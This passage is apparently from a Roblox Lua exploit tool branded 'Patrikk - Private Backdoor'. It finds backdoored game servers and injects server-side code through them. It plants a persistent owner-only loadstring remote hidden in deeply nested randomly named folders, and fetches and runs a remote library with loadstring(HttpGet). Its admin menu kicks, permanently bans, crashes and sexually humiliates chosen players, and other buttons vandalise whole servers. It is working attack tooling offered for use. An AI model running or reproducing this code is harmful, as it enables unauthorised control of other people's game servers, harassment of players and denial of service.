	local code = 'require(110756170974672).killbot("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_42);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.kingpin.LocalScript
local function C_46()
	local script = LMG["LocalScript_46"];
	local code = 'require(96569403624959).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "kingpin")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_46);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.oliver.LocalScript
local function C_4a()
	local script = LMG["LocalScript_4a"];
	local code = 'require(121806884124942)("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_4a);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.para v2.LocalScript
local function C_4e()
	local script = LMG["LocalScript_4e"];
	local code = 'require(115054413998661).Canner_Paranoy("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_4e);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.require exe.LocalScript
local function C_52()
	local script = LMG["LocalScript_52"];
	local code = 'require(125992639027440)["Require.EXE by E God"]("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_52);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.schizophrenia.LocalScript
local function C_56()
	local script = LMG["LocalScript_56"];
	local code = 'require(71359648090331).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "schizophrenia")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_56);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.096 unity.LocalScript
local function C_5a()
	local script = LMG["LocalScript_5a"];
	local code = 'require(110508056560855).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "Unity 096")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;

local code = 'require(98023597238305).load("' .. game.Players.LocalPlayer.Name .. '", "Sabre²")'	
	
LMG["sabre"].MouseButton1Click:Connect(function()	
	fireRemoteEvent(code)	
end)	

local code = 'require(97971706467461).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "scribble head")'	
	
LMG["scribble"].MouseButton1Click:Connect(function()	
	fireRemoteEvent(code)	
end)	

task.spawn(function()
    EnableDrag(LMG2L["Main_2"])
    EnableDrag(LMG["Frame_2"])
end)

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local toggle = Instance.new("TextButton", LMG2L["SpunchLOL_1"])
local mainFrame = LMG2L["Main_2"]

-- UI Setup
toggle.Size = UDim2.new(0, 45, 0, 45)
toggle.Position = UDim2.new(0, 20, 0, 200)
toggle.Text = '<font color="#FF5680">P</font>'
toggle.RichText = true
toggle.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
toggle.BackgroundColor3 = Color3.fromRGB(26,27,32)
toggle.TextColor3 = Color3.fromRGB(255,255,255)
toggle.TextSize = 24
toggle.AutoButtonColor = false

local corner = Instance.new("UICorner", toggle)
corner.CornerRadius = UDim.new(0, 6)

local stroke = Instance.new("UIStroke", toggle)
stroke.Thickness = 1
stroke.Color = Color3.fromRGB(97, 97, 97)
stroke.Transparency = 0.5
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Draggable Logic
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    local pos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    TweenService:Create(toggle, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {Position = pos}):Play()
end

toggle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = toggle.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

toggle.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then update(input) end
end)

local TweenService = game:GetService("TweenService")
local originalTransparencies = setmetatable({}, {__mode = "k"})

local function saveTransparencies(root)
    local function process(obj)
        local props = {}

        if obj:IsA("GuiObject") then
            props.BackgroundTransparency = obj.BackgroundTransparency
        end

        -- ScrollingFrame specific
        if obj:IsA("ScrollingFrame") then
            props.ScrollBarImageTransparency = obj.ScrollBarImageTransparency
        end
        
        -- Text based
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            props.TextTransparency = obj.TextTransparency
            props.TextStrokeTransparency = obj.TextStrokeTransparency
        end
        
        -- Image based
        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
            props.ImageTransparency = obj.ImageTransparency
        end
        
        -- ViewportFrames
        if obj:IsA("ViewportFrame") then
            props.ImageTransparency = obj.ImageTransparency
        end

        -- Strokes
        if obj:IsA("UIStroke") then
            props.Transparency = obj.Transparency
        end
        
        -- Only store if we found properties to track
        if next(props) then
            originalTransparencies[obj] = props
        end
    end

    -- Process root first
    process(root)
    
    -- Then process ALL descendants
    for _, descendant in ipairs(root:GetDescendants()) do
        process(descendant)
    end
end

-- Initialize saved state
saveTransparencies(mainFrame)

local function setFade(targetVisible, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    
    for obj, savedProps in pairs(originalTransparencies) do
        -- Ensure object still exists and has a parent
        if obj and obj.Parent then
            local tweenProps = {}
            
            for propName, originalValue in pairs(savedProps) do
                -- If targetVisible is true, go to original; if false, go to 1
                tweenProps[propName] = targetVisible and originalValue or 1
            end
            
            -- Create and play tween for each object
            local tween = TweenService:Create(obj, tweenInfo, tweenProps)
            tween:Play()
        end
    end
end

local opened = true
local isAnimating = false

toggle.MouseButton1Click:Connect(function()
    if isAnimating then return end
    isAnimating = true
    
    opened = not opened
    
    if opened then
        mainFrame.Visible = true
        setFade(true, 0.25)
        toggle:TweenSize(UDim2.new(0, 45, 0, 45), "Out", "Bounce", 0.4, true)
        task.delay(0.4, function()
            isAnimating = false
        end)
    else
        setFade(false, 0.25)
        toggle:TweenSize(UDim2.new(0, 38, 0, 38), "Out", "Bounce", 0.4, true)
        task.delay(0.4, function()
            mainFrame.Visible = false
            isAnimating = false
        end)
    end
end)

-- Scripts
local function C_8()
	local script = LMG2L["LocalScript_8"];
	script.Parent.MouseButton1Click:Connect(function()	
	      local editor = script.Parent.Parent.EditorScroll.Editor	
	      if editor.TextTransparency == 0 then
             editor.TextTransparency = 1
             LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://3926307971";-- show
             LMG2L["ImageLabelbla"]["ImageRectOffset"] = Vector2.new(564, 44);
             MG2L["ImageLabelbla"]["ImageRectSize"] = Vector2.new(36, 36);
          else
             editor.TextTransparency = 0
             LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://3926307971"; -- hide
             LMG2L["ImageLabelbla"]["ImageRectOffset"] = Vector2.new(84, 44);
             LMG2L["ImageLabelbla"]["ImageRectSize"] = Vector2.new(36, 36);
          end
	end)	
end;
task.spawn(C_8);

local function C_10()
	local script = LMG2L["LocalScript_10"];
	script.Parent.MouseButton1Click:Connect(function()	
	      script.Parent.Parent.EditorScroll.Editor.Text = ""	
	end)	
end;
task.spawn(C_10);

local function C_1a()
	local script = LMG2L["LocalScript_1a"];
	script.Parent.MouseButton1Click:Connect(function()	
	      script.Parent.Parent.Parent.Parent.Parent:Destroy()	
	end)	
end;
task.spawn(C_1a);

local function C_r6()
	local script = LMG2L["LocalScript_r6"];
	script.Parent.MouseButton1Click:Connect(function()	
           fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
     end)
end;
task.spawn(C_r6);

local function C_ni()
	local script = LMG2L["LocalScript_ni"];
	script.Parent.MouseButton1Click:Connect(function()	
           fireRemoteEvent("game.Players." .. game.Players.LocalPlayer.Name .. ":LoadCharacter()")
     end)
end;
task.spawn(C_ni);

local function C_sd()
	local script = LMG2L["LocalScript_sd"];
	script.Parent.MouseButton1Click:Connect(function()	
           fireRemoteEvent([[
              for _, v in pairs(game.Players:GetPlayers()) do
                 v:Kick("Game shutdowned by Patrikk - Private Backdoor")
              end
		   ]])
     end)
end;
task.spawn(C_sd);

local function C_23()
	local script = LMG2L["LocalScript_23"];
	script.Parent.MouseButton1Click:Connect(function()	
	      local code = script.Parent.Parent.EditorScroll.Editor.Text	
	      if code ~= "" then
                local success, result = pcall(function()
	               fireRemoteEvent(code)
                end)
                if success and foundExploit then
                   notify.Info("Patrikk","Successfully executed script!")
                elseif not foundExploit and success then
                   notify.Warn("Patrikk","Failed to execute script, No backdoor.")
                else
                   notify.Error("Patrikk","Failed to execute script!")
                end
	      else	
	           notify.Warn("Patrikk","Put a script first!")	
          end	
	end)	
end;
task.spawn(C_23);

local currentRemote
local ancestryConnection
local isScanning = false

local function watchRemote(remote)
    if ancestryConnection then
        ancestryConnection:Disconnect()
        ancestryConnection = nil
    end

    if not remote or typeof(remote) ~= "Instance" then return end
    currentRemote = remote

    ancestryConnection = remote.AncestryChanged:Connect(function(_, parent)
        if not parent and not isScanning then
            isScanning = true
            notify.Error("Patrikk", "Backdoor removed, attempting to scan...")

            local newRemote = nil
            
            for i = 1, 5 do
                task.wait(0.25)
                local found = findRemote()
                if found and found ~= remote then
                    newRemote = found
                    break
                end
            end

            if newRemote then
                notify.Info("Patrikk", "New backdoor was found!")
                isScanning = false
                watchRemote(newRemote)
            else
                notify.Error("Patrikk", "Scan failed. No backdoor was found.")
                isScanning = false
                currentRemote = nil
            end
        end
    end)
end

local initial = remoteEvent or remoteFunction
if not initial then
    initial = findRemote()
end

if initial then
    watchRemote(initial)
end
        
       fireRemoteEvent([[
local services = {
 game:GetService("PathfindingService"),
 game:GetService("PolicyService"),
 game:GetService("TestService"),
 game:GetService("FriendService"),
 game:GetService("SoundService"),
 game:GetService("LocalizationService"),
 game:GetService("MarketplaceService"),
 game:GetService("HttpService"),
 game:GetService("FeatureRestrictionManager"),
 game:GetService("Lighting"),
 game:GetService("ReplicatedStorage")
}

math.randomseed(os.clock() * 1e6)

local function rand()
 local t = {}
 for i = 1, math.random(6,12) do
  t[i] = string.char(
   math.random(97,122)
  )
 end
 return table.concat(t)
end

for _, svc in ipairs(services) do
 local p = svc

 for i = 1, 100 do
  local f = Instance.new("Folder")
  f.Name = rand()
  f.Parent = p
  p = f
 end

 local r = Instance.new("RemoteFunction")
 r.Name = "rbxAssetid_core__temp_3023g78"
 r.OnServerInvoke = function(plr)
  plr:Kick("Backdoor has been secured by Patrikk - Private Backdoor")
 end
 r.Parent = p
end
]])  

fireRemoteEvent([[
	local services = {
    game:GetService("PathfindingService"),
    game:GetService("PolicyService"),
    game:GetService("Workspace")
    game:GetService("TestService"),
    game:GetService("FriendService"),
    game:GetService("SoundService"),
    game:GetService("LocalizationService"),
    game:GetService("MarketplaceService"),
    game:GetService("HttpService"),
	game:GetService("FeatureRestrictionManager"),
	game:GetService("Lighting"),
	game:GetService("ReplicatedStorage")
}

for _, svc in ipairs(services) do
  for r = 1, 100 do 
    local r = Instance.new("RemoteFunction")
    r.Name = "spunch.bd_cssr6-O1"
    r.OnServerInvoke = function(player)
        player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
    end
    r.Parent = svc
  end
end]])

fireRemoteEvent([[
local frm = game:GetService("FeatureRestrictionManager")

local remoteFunction = Instance.new("RemoteFunction")
remoteFunction.Name = "spunch.bd_cssr6-01"
remoteFunction.Parent = frm

local loadstring = require(13684410229)

remoteFunction.OnServerInvoke = function(player, code)
    if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
        player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
        return
    end
    loadstring(code)()
end
]])

fireRemoteEvent([[
local Players = game:GetService("Players")

local allowedPlayer = "]] .. game.Players.LocalPlayer.Name .. [["

local suspiciousKeywords = {
    "hd admin","ranker","java1","darklord","pracharatbampen","777ililo","trumdidai",
    "sugma","ro xploit","secret service panel","kid","666","n00t","ximi",
    "k1d","kidd","k1dd","k00p","tubers","h01pk","ban","dreambull","krnkidssus",
    "ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","l00pz","change map",
    "xxandresxx","c00lgui","c00l","elmarz","teamf*t","teamfat","koop","n00t n00t",
    "5x5x5x5","g00b","kick","undetectable gui","undetectable","c00lkidd",
    "acron","russia","infector","potato","sans_gboard","777lilo","g00by",
    "starp4tch","user1337","menotgonnadobadstuff","team fat","traffix",
    "8t010t8","darius","j00p","144anz","sigma","topkek","polaria","n*zi map",
    "noot","1x1x1x1","lacking923","kaax","s1n","topk3k","decal spam","n00zgui",
    "k_aax","ep1c","zazol","lalol","cxyz","saudi","rc7","dimin","happyappy",
    "j01tar0","koma","gigxxx","hax0rz","g00l","tr00g","mat3l0rd","t00pkidd",
    "enstrio","br1cked","hax","acorn","logger","blue2spooky","krsp",
}

local function isSuspicious(str)
    if not str then return false end
    str = string.lower(str)

    for _, keyword in ipairs(suspiciousKeywords) do
        if string.find(str, keyword) then
            return true
        end
    end

    return false
end

local function Hint(text)
    local hint = Instance.new("Hint")
    hint.Name = "SAS"
    hint.Text = text
    hint.Parent = workspace

    task.delay(3, function()
        if hint then
            hint:Destroy()
        end
    end)
end

local function handleObject(obj, player)
    if player.Name == allowedPlayer then return end

    if obj:IsA("ScreenGui") or obj:IsA("Frame") or obj:IsA("TextLabel") or obj:IsA("TextButton") then
        local nameStr = obj.Name
        local textStr = obj:IsA("TextLabel") and obj.Text or ""

        if isSuspicious(nameStr) or isSuspicious(textStr) then
            Hint("PTK Removed Suspicious ui: "..nameStr.." from "..player.DisplayName)

            local root = obj
            while root and not root:IsA("ScreenGui") do
                root = root.Parent
            end

            if root then
                root:Destroy()
            else
                obj:Destroy()
            end
        end
    end
end

local function monitorPlayer(player)
    local function setup()
        local playerGui = player:WaitForChild("PlayerGui")

        for _, obj in ipairs(playerGui:GetDescendants()) do
            pcall(handleObject, obj, player)
        end

        playerGui.DescendantAdded:Connect(function(obj)
            pcall(handleObject, obj, player)
        end)
    end

    if player.Character then
        setup()
    end

    player.CharacterAdded:Connect(setup)
end

for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(monitorPlayer, player)
end

Players.PlayerAdded:Connect(function(player)
    task.spawn(monitorPlayer, player)
end)
]])

	local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/systemzyx/betterlibs/refs/heads/main/betteruilib.lua"))()
	local CommandsMenu = library:Window("Patrikk - Private Admin")
	
	local selectedPlayer = nil
	local function findPlayer(name)
		for _, player in pairs(game.Players:GetPlayers()) do
			if string.find(string.lower(player.Name), string.lower(name)) or string.find(string.lower(player.DisplayName), string.lower(name)) then
				return player
			end
		end
		return nil
	end
	local selectedPlayerLabel = CommandsMenu:Label("Selected Player: N/A")
	
	CommandsMenu:Textbox("Target Player", "Username", function(playertc)
		selectedPlayer = findPlayer(playertc)
		if selectedPlayer then
			selectedPlayerLabel.Text = "Selected Player: " .. selectedPlayer.DisplayName
		else
			selectedPlayerLabel.Text = "Player not found"
		end
	end)
	
	CommandsMenu:Button("Kick Player", function()
		if selectedPlayer then
			fireRemoteEvent('for i,v in pairs(game.Players:GetPlayers()) do if v.Name == "' .. selectedPlayer.Name .. '" then v:Kick("You have been kicked") end end')
		end
	end)
	CommandsMenu:Button("Perm BanAsync Player", function()
		if selectedPlayer and selectedPlayer ~= game.Players.LocalPlayer then
			fireRemoteEvent([[
				local Players = game:GetService("Players")
				local targetUserId = ]] .. selectedPlayer.UserId .. [[
				if targetUserId ~= ]] .. game.Players.LocalPlayer.UserId .. [[ then
					pcall(function()
						Players:BanAsync({
							UserIds = {targetUserId},
							Duration = -1,
							DisplayReason = "You've been Perma-BANNED.",
							PrivateReason = "hahaha",
							ExcludeAltAccounts = false,
							ApplyToUniverse = true
						})
					end)
				end
			]])
		else
			selectedPlayerLabel.Text = "Cannot ban yourself!"
		end
	end)
	CommandsMenu:Button("Reset Player", function()
		if selectedPlayer then 
			fireRemoteEvent("game.Players." .. selectedPlayer.Name .. ":LoadCharacter()")
		end
	end)
	CommandsMenu:Button("D#ck Player", function()
		if selectedPlayer then 
			fireRemoteEvent('require(140321069022189).pingas("' .. selectedPlayer.Name .. '")')
		end
	end)
	CommandsMenu:Button("Crash Player", function()
		if selectedPlayer then 
	       local code = [[
	local function addtool()
	local tool = Instance.new("Tool")
	tool.ToolTip = string.rep("A", 200)
	tool.Name = string.rep("A", 200)
	tool.CanBeDropped = false
	tool.Parent = game.Players["]] .. selectedPlayer.Name .. [["].Backpack
	end
	
	for b = 1, 9007199254740991 do
	task.spawn(function()
	addtool()
	end)
	end
	]]
	
	fireRemoteEvent(code)
		end
	end)
	CommandsMenu:Button("F#ck Player", function()
		if selectedPlayer then 
			fireRemoteEvent([[
	function fWeld(zName, zParent, zPart0, zPart1, zCoco, a, b, c, d, e, f)
	local funcw = Instance.new("Weld")
	funcw.Name = zName
	funcw.Parent = zParent
	funcw.Part0 = zPart0
	funcw.Part1 = zPart1
	if (zCoco == true) then
	funcw.C0 = CFrame.new(a, b, c) * CFrame.fromEulerAnglesXYZ(d, e, f)
	else
	funcw.C1 = CFrame.new(a, b, c) * CFrame.fromEulerAnglesXYZ(d, e, f)
	end
	return funcw
	end
	function fun(n1, n2)
	pcall(function()
	t1 = game.Players[n1].Character.Torso
	t2 = game.Players[n2].Character.Torso
	t2.Parent.Humanoid.PlatformStand = true
	t1["Left Shoulder"]:Remove()
	ls1 = Instance.new("Weld")
	ls1.Parent = t1
	ls1.Part0 = t1
	ls1.Part1 = t1.Parent["Left Arm"]
	ls1.C0 = CFrame.new(-1.5,0,0)
	ls1.Name = "Left Shoulder"
	t1["Right Shoulder"]:Remove()
	rs1 = Instance.new("Weld")
	rs1.Parent = t1
	rs1.Part0 = t1
	rs1.Part1 = t1.Parent["Right Arm"]
	rs1.C0 = CFrame.new(1.5,0,0)
	rs1.Name = "Right Shoulder"
	t2["Left Shoulder"]:Remove()
	ls2 = Instance.new("Weld")
	ls2.Parent = t2
	ls2.Part0 = t2
	ls2.Part1 = t2.Parent["Left Arm"]
	ls2.C0 = CFrame.new(-1.5,0,0)
	ls2.Name = "Left Shoulder"
	t2["Right Shoulder"]:Remove()
	rs2 = Instance.new("Weld")
	rs2.Parent = t2
	rs2.Part0 = t2
	rs2.Part1 = t2.Parent["Right Arm"]
	rs2.C0 = CFrame.new(1.5,0,0)
	rs2.Name = "Right Shoulder"
	t2["Left Hip"]:Remove()
	lh2 = Instance.new("Weld")
	lh2.Parent = t2
	lh2.Part0 = t2
	lh2.Part1 = t2.Parent["Left Leg"]
	lh2.C0 = CFrame.new(-0.5,-2,0)
	lh2.Name = "Left Hip"
	t2["Right Hip"]:Remove()
	rh2 = Instance.new("Weld")
	rh2.Parent = t2
	rh2.Part0 = t2
	rh2.Part1 = t2.Parent["Right Leg"]
	rh2.C0 = CFrame.new(0.5,-2,0)
	rh2.Name = "Right Hip"
	local d = Instance.new("Part")
	d.TopSurface = 0
	d.BottomSurface = 0
	d.BrickColor = BrickColor.new("Medium stone grey")
	d.Shape = "Ball"
	d.Parent = t1
	d.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = d
	dm.Scale = Vector3.new(0.4,0.4,0.4)
	fWeld("weld",t1,t1,d,true,-0.2,-1.3,-0.6,0,0,0)
	d2 = d:Clone()
	d2.Parent = t1
	fWeld("weld",t1,t1,d2,true,0.2,-1.3,-0.6,0,0,0)
	local c = Instance.new("Part")
	c.TopSurface = 0
	c.BottomSurface = 0
	c.CanCollide = false
	c.BrickColor = BrickColor.new("Pastel brown")
	c.Parent = t1
	c.formFactor = "Custom"
	c.Size = Vector3.new(0.4,1.3,0.4)
	cm = Instance.new("CylinderMesh")
	cm.Parent = c
	a = fWeld("weld",t1,t1,c,true,0,-1,-0.52+(-c.Size.y/2),math.rad(-80),0,0)
	c2 = d:Clone()
	c2.BrickColor = BrickColor.new("Medium stone grey")
	c2.Mesh.Scale = Vector3.new(0.4,0.62,0.4)
	c2.Parent = t1
	fWeld("weld",c,c,c2,true,0,0+(c.Size.y/2),0,math.rad(-10),0,0)
	local bl = Instance.new("Part")
	bl.TopSurface = 0
	bl.BottomSurface = 0
	bl.CanCollide = false
	bl.BrickColor = BrickColor.new("Pastel brown")
	bl.Shape = "Ball"
	bl.Parent = t2
	bl.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = bl
	dm.Scale = Vector3.new(1.2,1.2,1.2)
	fWeld("weld",t2,t2,bl,true,-0.5,0.5,-0.6,0,0,0)
	local br = Instance.new("Part")
	br.TopSurface = 0
	br.BottomSurface = 0
	br.CanCollide = false
	br.BrickColor = BrickColor.new("Pastel brown")
	br.Shape = "Ball"
	br.Parent = t2
	br.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = br
	dm.Scale = Vector3.new(1.2,1.2,1.2)
	fWeld("weld",t2,t2,br,true,0.5,0.5,-0.6,0,0,0)
	local bln = Instance.new("Part")
	bln.TopSurface = 0
	bln.BottomSurface = 0
	bln.CanCollide = false
	bln.Shape = "Ball"
	bln.Parent = t2
	bln.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = bln
	dm.Scale = Vector3.new(0.2,0.2,0.2)
	fWeld("weld",t2,t2,bln,true,-0.5,0.5,-1.2,0,0,0)
	local brn = Instance.new("Part")
	brn.TopSurface = 0
	brn.BottomSurface = 0
	brn.CanCollide = false
	brn.Shape = "Ball"
	brn.Parent = t2
	brn.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = brn
	dm.Scale = Vector3.new(0.2,0.2,0.2)
	fWeld("weld",t2,t2,brn,true,0.5,0.5,-1.2,0,0,0)
	lh2.C1 = CFrame.new(0,-1.5,-0.5) * CFrame.Angles(0.9,-0.4,0)
	rh2.C1 = CFrame.new(0,-1.5,-0.5) * CFrame.Angles(0.9,0.4,0)
	ls2.C1 = CFrame.new(-0.5,-1.3,-0.5) * CFrame.Angles(0.9,-0.4,0)
	rs2.C1 = CFrame.new(0.5,-1.3,-0.5) * CFrame.Angles(0.9,0.4,0)
	ls1.C1 = CFrame.new(-0.5,0.7,0) * CFrame.Angles(-0.9,-0.4,0)
	rs1.C1 = CFrame.new(0.5,0.7,0) * CFrame.Angles(-0.9,0.4,0)
	if t1:findFirstChild("weldx") ~= nil then
	t1.weldx:Remove()
	end
	we = fWeld("weldx", t1, t1, t2, true, 0, -0.9, -1.3, math.rad(-90), 0, 0)
	n = t2.Neck
	n.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
	end)
	coroutine.resume(coroutine.create(function()
	while wait() do
	for i = 1,6 do
	we.C1 = we.C1 * CFrame.new(0,-0.3,0)
	wait()
	end
	 
	for i = 1,6 do
	we.C1 = we.C1 * CFrame.new(0,0.3,0)
	wait()
	end
	end
	end))
	end
	fun("]] .. game.Players.LocalPlayer.Name .. [[", "]] .. selectedPlayer.Name .. [[")
	]])
		end
	end)
	CommandsMenu:Button("Silly Player", function()
		if selectedPlayer then 
			fireRemoteEvent('require(78730160118005).justabitsilly("' .. selectedPlayer.Name .. '")')
		end
	end)
	CommandsMenu:Button("Hack alert Player", function()
		if selectedPlayer then 
			fireRemoteEvent('require(10557341183).alert("' .. selectedPlayer.Name .. '", "YOU HAVE BEEN HACKED BY C00LKIDD!!!")')
		end
	end)
	CommandsMenu:Button("Lava CHIICKEN", function()
			fireRemoteEvent('local s=Instance.new("Sound",workspace);s.SoundId="rbxassetid://111172243066964";s.Looped=true;s:Play()')
			fireRemoteEvent('require(78976842635186)')
			fireRemoteEvent('while true do for _,p in ipairs(game:GetService("Players"):GetPlayers()) do local bp=p:FindFirstChild("Backpack") if bp then local t=Instance.new("Tool") t.RequiresHandle=false local e={"🐔","💥","🍗","🔥","💀","🥵","🤝","🥴","😏","😰"} t.Name="chicken_"..math.random(100000,999999999)..e[math.random(1,#e)]..e[math.random(1,#e)]..e[math.random(1,#e)] t.Parent=bp end end task.wait(0.1) end')
	end)
	CommandsMenu:Button("Death?", function()
			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="death."s.SoundId="rbxassetid://35930009"s:Play()s.Looped=true')
			fireRemoteEvent('require(15413579595):Death()')
	end)
	CommandsMenu:Button("EL MAXWELL!!", function()
			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="EL GATO or MASWELL"s.SoundId="rbxassetid://104483584177040"s:Play()s.Looped=true repeat wait(0.01) until s.IsLoaded==true wait(2)local d=Instance.new("DistortionSoundEffect",s)d.Level=0.8 local sky=Instance.new("Sky",game:GetService("Lighting"))sky.SkyboxBk="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxFt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxLf="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxRt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxUp="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxDn="http://www.roblox.com/asset/?id=4575171289"sky.CelestialBodiesShown=false sky.StarCount=999999999999999999 for _,p in ipairs(game:GetService("Players"):GetPlayers())do if p.Character then p.Character:Destroy()end end local l=game:GetService("Lighting")l.FogEnd=1000 l.FogStart=900 l.FogColor=Color3.new(math.random(),math.random(),math.random()) local m=Instance.new("Message",workspace)m.Text="oooo nice computer you got there can i have it" local t=game:FindFirstChild("Teams")if t then t:ClearAllChildren()end while true do wait(0.01) if t then local tm=Instance.new("Team",t)tm.Name="maxwell real?!?"..tostring(math.random(1,33373))tm.TeamColor=BrickColor.Random()end for i=1,15 do local c=Instance.new("Part",workspace)local ms=Instance.new("SpecialMesh",c)ms.MeshType=Enum.MeshType.FileMesh ms.MeshId="rbxassetid://4934166503"ms.TextureId="rbxassetid://4934166532"c.Touched:Connect(function(o)o:Destroy()end)c.Size=Vector3.new(6.502,11.339,14.281)c.CFrame=CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))end end')
	end)

fireRemoteEvent('require(3986243232).load("Patrikk anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
        notify.Info("Patrikk","Backdoor found! Implemented backdoor protection & anti skid.")
    else
        notify.Warn("Patrikk","No backdoor found.")
        LMG2["ScanButton_c"]["Text"] = "No backdoor found :("
        task.wait(2)
        LMG2["ScanButton_c"]["Text"] = "Scan Backdoor"
    end
end)
